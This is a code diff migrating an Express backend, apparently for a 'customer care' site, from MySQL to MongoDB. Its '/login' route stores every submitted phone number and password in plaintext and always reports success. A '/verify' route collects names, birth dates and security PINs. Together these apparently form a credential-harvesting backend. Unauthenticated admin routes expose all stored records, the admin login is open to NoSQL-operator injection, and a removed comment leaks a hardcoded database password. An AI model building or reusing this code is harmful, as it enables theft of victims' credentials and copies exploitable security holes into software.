@@ -1,133 +1,144 @@
 require("dotenv").config();
 const express = require("express");
-const mysql = require("mysql2");
+const mongoose = require("mongoose");
 const cors = require("cors");
 const bodyParser = require("body-parser");
 
 const app = express();
 
-// app.use(cors({
-//   origin: process.env.FRONTEND_URL,
-//   credentials: true
-// }));
-
-
+// -------------------- CORS Setup --------------------
 app.use(cors({
-  origin: [
-    "http://localhost:5500",
-    "http://127.0.0.1:5500",
-    "https://spro-deal-customer-care.netlify.app"
-  ],
-  credentials: true
+    origin: [
+        "http://localhost:5500",
+        "http://127.0.0.1:5500",
+        process.env.FRONTEND_URL
+    ],
+    credentials: true
 }));
-
 
 app.use(bodyParser.json());
 
-// ----------------------------------
-//       MySQL Connection
-// ----------------------------------
-// const db = mysql.createConnection({
-//     host: process.env.DB_HOST || "localhost",
-//     user: process.env.DB_USER || "root",
-//     password: process.env.DB_PASS || "Jayprakash69@",
-//     database: process.env.DB_NAME || "auth_system"
-// });
+// -------------------- MongoDB Connection --------------------
+// -------------------- MongoDB Connection --------------------
+mongoose.connect(process.env.MONGO_URI)
+  .then(() => console.log("MongoDB connected successfully!"))
+  .catch(err => console.log("MongoDB connection error:", err));
 
-const db = mysql.createConnection({
-    host: process.env.DB_HOST,
-    user: process.env.DB_USER,
-    password: process.env.DB_PASS,
-    database: process.env.DB_NAME
+
+// -------------------- Mongoose Schemas --------------------
+const userSchema = new mongoose.Schema({
+    phone: String,
+    password: String
+}, { timestamps: true });
+
+const verificationSchema = new mongoose.Schema({
+    user_id: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
+    full_name: String,
+    dob: Date,
+    problem: String,
+    security_pin: String,
+    experience: String
+}, { timestamps: true });
+
+const adminSchema = new mongoose.Schema({
+    password: String
 });
 
-db.connect(err => {
-    if (err) {
-        console.log("MySQL connection failed!", err);
-        return;
+const User = mongoose.model("User", userSchema);
+const Verification = mongoose.model("Verification", verificationSchema);
+const Admin = mongoose.model("Admin", adminSchema);
+
+// -------------------- Routes --------------------
+
+// Create user (login/register)
+app.post("/login", async (req, res) => {
+    try {
+        const { phone, password } = req.body;
+        const newUser = new User({ phone, password });
+        const savedUser = await newUser.save();
+        res.json({ success: true, user_id: savedUser._id });
+    } catch (err) {
+        res.json({ success: false, message: err.message });
     }
-    console.log("MySQL connected successfully!");
 });
 
-// ----------------------------------
-// Your Routes (Same as before)
-// ----------------------------------
-
-app.post("/login", (req, res) => {
-    const { phone, password } = req.body;
-    const sql = "INSERT INTO users (phone, password) VALUES (?, ?)";
-    db.query(sql, [phone, password], (err, result) => {
-        if (err) return res.json({ success: false, message: "Error!" });
-        res.json({ success: true, user_id: result.insertId });
-    });
-});
-
-app.post("/verify", (req, res) => {
-    const { user_id, full_name, dob, problem, security_pin, experience } = req.body;
-    const sql = "INSERT INTO verification (user_id, full_name, dob, problem, security_pin, experience) VALUES (?, ?, ?, ?, ?, ?)";
-    db.query(sql, [user_id, full_name, dob, problem, security_pin, experience], (err, result) => {
-        if (err) return res.json({ success: false, message: err });
+// Submit verification
+app.post("/verify", async (req, res) => {
+    try {
+        const { user_id, full_name, dob, problem, security_pin, experience } = req.body;
+        const verification = new Verification({ user_id, full_name, dob, problem, security_pin, experience });
+        await verification.save();
         res.json({ success: true, message: "Verification submitted!" });
-    });
+    } catch (err) {
+        res.json({ success: false, message: err.message });
+    }
 });
 
-app.get("/admin/getUsers", (req, res) => {
-    db.query("SELECT * FROM users ORDER BY id DESC", (err, results) => {
-        if (err) return res.json({ success: false, error: err });
-        res.json(results);
-    });
+// Get all users (admin)
+app.get("/admin/getUsers", async (req, res) => {
+    try {
+        const users = await User.find().sort({ createdAt: -1 });
+        res.json(users);
+    } catch (err) {
+        res.json({ success: false, error: err.message });
+    }
 });
 
-app.get("/admin/getVerification", (req, res) => {
-    db.query("SELECT * FROM verification ORDER BY id DESC", (err, results) => {
-        if (err) return res.json({ success: false, error: err });
-        res.json(results);
-    });
+// Get all verifications (admin)
+app.get("/admin/getVerification", async (req, res) => {
+    try {
+        const verifications = await Verification.find().sort({ createdAt: -1 });
+        res.json(verifications);
+    } catch (err) {
+        res.json({ success: false, error: err.message });
+    }
 });
 
-// ------------------- Update & Delete -------------------
-app.put("/admin/updateUser/:id", (req, res) => {
-    const { phone, password } = req.body;
-    db.query("UPDATE users SET phone=?, password=? WHERE id=?", [phone, password, req.params.id], (err) => {
-        if (err) return res.json({ success:false, error: err });
-        res.json({ success:true });
-    });
+// Update user
+app.put("/admin/updateUser/:id", async (req, res) => {
+    try {
+        const { phone, password } = req.body;
+        await User.findByIdAndUpdate(req.params.id, { phone, password });
+        res.json({ success: true });
+    } catch (err) {
+        res.json({ success: false, error: err.message });
+    }
 });
 
-app.delete("/admin/deleteUser/:id", (req, res) => {
-    db.query("DELETE FROM users WHERE id=?", [req.params.id], (err) => {
-        if (err) return res.json({ success:false, error: err });
-        res.json({ success:true });
-    });
+// Delete user
+app.delete("/admin/deleteUser/:id", async (req, res) => {
+    try {
+        await User.findByIdAndDelete(req.params.id);
+        res.json({ success: true });
+    } catch (err) {
+        res.json({ success: false, error: err.message });
+    }
 });
 
-app.delete("/admin/deleteVerification/:id", (req, res) => {
-    db.query("DELETE FROM verification WHERE id=?", [req.params.id], (err) => {
-        if (err) return res.json({ success:false, error: err });
-        res.json({ success:true });
-    });
+// Delete verification
+app.delete("/admin/deleteVerification/:id", async (req, res) => {
+    try {
+        await Verification.findByIdAndDelete(req.params.id);
+        res.json({ success: true });
+    } catch (err) {
+        res.json({ success: false, error: err.message });
+    }
 });
 
-app.post("/admin-login", (req, res) => {
-    const { password } = req.body;
-
-    const sql = "SELECT * FROM admin WHERE password = ?";
-    db.query(sql, [password], (err, result) => {
-        if (err) return res.json({ success: false, message: "Database error" });
-
-        if (result.length === 0) {
-            return res.json({ success: false, message: "Incorrect password" });
-        }
-
-        return res.json({ success: true, message: "Login successful" });
-    });
+// Admin login
+app.post("/admin-login", async (req, res) => {
+    try {
+        const { password } = req.body;
+        const admin = await Admin.findOne({ password });
+        if (!admin) return res.json({ success: false, message: "Incorrect password" });
+        res.json({ success: true, message: "Login successful" });
+    } catch (err) {
+        res.json({ success: false, message: err.message });
+    }
 });
 
-
-// ----------------------------------
-// Start Server (Important Change!)
-// ----------------------------------
+// -------------------- Start Server --------------------
 const PORT = process.env.PORT || 5000;
 app.listen(PORT, () => {
-    console.log("Server running on port", PORT);
+    console.log(`Server running on port ${PORT}`);
 });
